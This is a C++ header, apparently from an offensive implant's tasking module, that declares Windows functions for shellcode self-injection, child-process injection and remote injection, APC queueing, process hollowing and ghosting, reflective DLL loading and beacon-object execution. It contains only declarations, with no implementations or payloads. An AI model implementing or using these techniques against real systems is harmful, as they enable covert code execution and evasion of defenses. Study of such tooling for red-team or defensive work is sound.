//
// Created by diago on 2024-05-27.
//

#ifndef INJECTION_HPP
#define INJECTION_HPP
#include <Windows.h>
#include <string>
#include <common.hpp>
#include <io.hpp>
#include <function_ptrs.hpp>
#include <structs.hpp>
#include <misc.hpp>

#define LURCH_IMAGE_NOT_AT_BASE 0x40000003L

namespace tasking {
    std::string execute_bof(const std::string& object_file, unsigned char* arguments, int argc);
    std::string run_shellcode(uint32_t pid, bool inject_child, bool get_output_if_child, const std::string& shellcode_buffer);
    std::string runexe(bool hollow, const std::string& file_buffer);

    std::string shellcode_self_inject(void const* payload, uint32_t payload_size);
    std::string shellcode_inject_child(void* payload, uint32_t payload_size, bool get_output);
    std::string shellcode_remote_inject(uint32_t pid, void const* payload, uint32_t payload_size);
    bool queue_apc(HANDLE hthread, void* address, bool resume_thread);
    bool queue_apc_with_arguments(HANDLE hthread, void* address, void* arg1, void* arg2, void* arg3, bool resume_thread);

    bool hollow(HANDLE hsection, uint32_t entry_point_rva, void* preferred_base, bool& mapped_at_preferred, std::string& console_output);
    bool ghost(HANDLE hsection, uint32_t entry_point_rva);
    HANDLE create_ghosted_section(const std::string& payload_buffer);
    std::string rundll(const std::string& file_buffer);

    bool initialize_dll_info(const std::string& dll_buffer, dll_info* pdll_info);
    bool remap_dll_sections(dll_info* pdll_info);
    bool handle_dll_relocations(dll_info* pdll_info);
    bool resolve_dll_imports(dll_info* pdll_info);
    bool fix_dll_memory_permissions(dll_info* pdll_info);

    bool load_object(void* pobject, const std::string& func_name, unsigned char* arguments, uint32_t argc);
    bool object_execute(object_context* ctx, const char* entry, unsigned char* args, const uint32_t argc);
    void* resolve_object_symbol(const char* symbol);
    void object_relocation(uint32_t type, void* needs_relocating, void* section_base);
    bool process_object_sections(object_context* ctx);

    uint32_t object_virtual_size(object_context* ctx);
}

#endif //INJECTION_HPP
